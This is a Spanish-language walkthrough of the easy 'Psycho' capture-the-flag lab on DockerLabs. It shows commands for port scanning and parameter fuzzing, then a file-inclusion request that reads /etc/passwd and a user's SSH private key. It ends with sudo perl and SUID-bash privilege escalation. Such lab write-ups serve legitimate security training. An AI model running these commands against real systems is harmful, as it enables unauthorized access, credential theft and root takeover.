# Psycho (DockerLabs) — Writeup

Dificultad: fácil

Esta máquina es de esas que te recuerdan que no hace falta buscar vulnerabilidades complejas de día cero para entrar en un sistema. A veces, el desarrollador ha dejado una puerta trasera lógica o un parámetro oculto que simplemente está pidiendo a gritos que lo pruebes. Es un ejercicio clásico de enumeración donde la paciencia con las herramientas de fuzzing marca la diferencia entre quedarte fuera o entrar hasta la cocina.

IP de laboratorio: `172.17.0.2`

---

## Planteamiento

El acceso inicial se consigue mediante un LFI en un parámetro oculto del servidor web, lo que me permite robar la clave privada SSH. Una vez dentro, la escalada de privilegios se divide en dos saltos: primero abuso de permisos de sudo sobre perl para cambiar de usuario, y después manipulo un script de Python con privilegios de root para escalar definitivamente.

---

## Paso 0: desplegar el laboratorio

```bash
unzip psycho.zip
sudo bash auto_deploy.sh psycho.tar
```

---

## Paso 1: escaneo de puertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

El escaneo devuelve lo básico: el puerto 22 para SSH y el 80 para el servicio web. Nada extraño, así que lo lógico es empezar viendo qué hay en la web.

---

## Paso 2: descubrimiento del LFI

Al entrar por el navegador, la página no enseña gran cosa. Toca hacer fuzzing para ver si hay algún parámetro escondido que procese información. Usando wfuzz sobre index.php encuentro rápidamente que el parámetro secret responde distinto.

```bash
wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://172.17.0.2/index.php?FUZZ=test
```

Al probar `secret` veo que es la clave. Intentando leer archivos del sistema con `?secret=/etc/passwd` confirmo el LFI. Ya solo queda buscar la llave privada del usuario vaxei en `/home/vaxei/.ssh/id_rsa`.

```bash
curl "http://172.17.0.2/index.php?secret=/home/vaxei/.ssh/id_rsa"
```

---

## Paso 3: acceso inicial y escalada a luisillo

Copio el contenido, le doy los permisos 600 y entro por SSH. Una vez dentro, lo primero es mirar qué puedo ejecutar con sudo.

```bash
ssh -i id_rsa vaxei@172.17.0.2
sudo -l
```

Veo que puedo ejecutar perl como usuario luisillo. La gente de GTFOBins tiene la respuesta lista para este caso: invocar una shell de sistema directamente desde perl.

```bash
sudo -u luisillo perl -e 'exec "/bin/bash"'
```

---

## Paso 4: escalada a root

Ya soy luisillo. Repito el chequeo de sudo y aparece un script de Python que puedo ejecutar como root. Al leer el script veo que es sencillo y, lo mejor, tengo permisos de escritura sobre él. Lo edito para inyectar una llamada que convierta bash en SUID.

```bash
sudo -l
cat script.py
echo 'import os; os.chmod("/bin/bash", 0o4755)' >> script.py
sudo python3 script.py
/bin/bash -p
```

---

## Conclusión

Lo que más me mosquea de esta máquina es lo fácil que se olvida limpiar los permisos de sudo en entornos de desarrollo. Si dejas que un usuario ejecute un script como root, asegúrate de que no pueda tocar el código del mismo, porque es la receta perfecta para perder el control de la máquina en dos minutos.

La lección aquí es sencilla: nunca confíes en que un script ejecutado como root es seguro solo porque "hace una tarea específica". Si el atacante tiene permisos de edición, el juego ha terminado.

---

Basado en el writeup de IHATEFW: https://github.com/IHATEFW/Writeups/blob/main/DockerLabs-Facil/Psycho.md
